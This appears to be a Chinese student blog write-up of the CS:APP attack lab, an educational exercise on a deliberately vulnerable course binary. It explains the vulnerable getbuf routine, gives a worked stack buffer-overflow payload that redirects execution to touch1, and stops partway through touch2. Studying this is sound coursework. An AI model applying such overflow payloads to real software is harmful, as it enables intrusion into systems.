---
title: CS:APP attacklab
math: true
date: 2022-04-06 10:26:35
cover: https://virgil-civil-1311056353.cos.ap-shanghai.myqcloud.com/img/20230628184041.png
tag:
  - CMU
  - CSAPP
category:
  - 关于CSAPP的一些零零碎碎
---

>  一个一开始完全不知道怎么做的实验
>
>  前置条件：阅读完第三章

<!--more-->

# 实验准备

在官网下载 `handout`并解压到本地文件夹，==仔细阅读==`Writeup`文档，文档中详细介绍了实验的做法，需要用到的东西等内容。

于是运行命令：

```shell
objdump ctarget > ctarget.s
objdump rtarget > rtarget.s
```

由文档知，`ctarget` 为第一个任务，`rtarget` 为第二个任务，其中 `farm.c` 是 `rtarget` 才需要用到的，`hex2raw` 是一个可执行文件，能将十六进制数转为二进制。

新建一个文本文件，命名为 `ans.txt` ，我们可以通过命令：

```shell
cat ans.txt | ./hex2raw | ./ctarget -q
```

来得到运行结果。若没有参数 `-q` 则会出现 `Error`，因为你没有 `CSAPP` 的账号，不能发送到服务器上去……（你没资格啊，你没资格啊——）



# 实验过程

## ctarget



```c
void test(){
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}

unsigned getbuf() { 
    char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

我们所需要做的，就是在调用 `getbuf` 函数返回时，不返回到 `test` 函数，而返回到 `touch_`函数。

并且需要使用的攻击方式是注入代码 / 地址，使缓冲区溢出。

### touch1

```c
void touch1(){
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}

```

`touch1` 很简单，我们可以阅读 `getbuf` 部分的汇编可以发现：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

`getbuf` 分配了 $40$ 个栈帧。于是，为了返回时跳转到 `touch1` 函数，我们只需要先填满 `getbuf` 的栈帧，然后将返回处的地址改为 `touch1` 的地址。我们可以从 `touch1` 的汇编得到其地址：

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

也就是 `0x4017c0`。于是答案为：

```asm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

注意地址需要用小端法书写（在第二章中有提到x86-64的机器都是用小端法）

### touch2

```c
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

这里的 `cookie` 在解压出的文件 `cookie.txt` 已经给出，于是，我们需要的就是在调用 `touch2` 时，传入一个参数 `val` 使其与 `cookie` 相等。

在 `Writeup` 文档中解释说，解决这个问题需要注入代码，通过代码来传入赋值给参数并调用 `touch2` 。

"不想写了！！"



